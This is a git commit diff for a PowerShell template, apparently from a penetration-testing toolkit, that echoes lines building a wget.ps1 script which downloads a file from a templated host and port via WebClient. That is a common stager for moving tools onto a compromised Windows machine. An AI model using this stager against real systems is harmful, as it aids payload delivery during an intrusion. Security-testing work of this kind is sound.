2747396066f5eadc187b3422821b68f1b761c41d
Calum <cgboal521@gmail.com>
2018-02-08 03:06:10 +0000

    initial commit

--- templates/wget.ps1
+++ templates/wget.ps1
@@ -1,7 +1,7 @@
 echo $storageDir = $pwd > wget.ps1
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1
-echo $url = "http://{{ host.ip }}:{{ host.port }}/$f" >>wget.ps1
-echo $file = "$0" >>wget.ps1
+echo $url = "http://{{ host.ip }}:{{ host.port }}/" + $args[0] >>wget.ps1
+echo $file = "$storageDir/" + $args[1] >>wget.ps1
 echo $webclient.DownloadFile($url,$file) >>wget.ps1
 
 
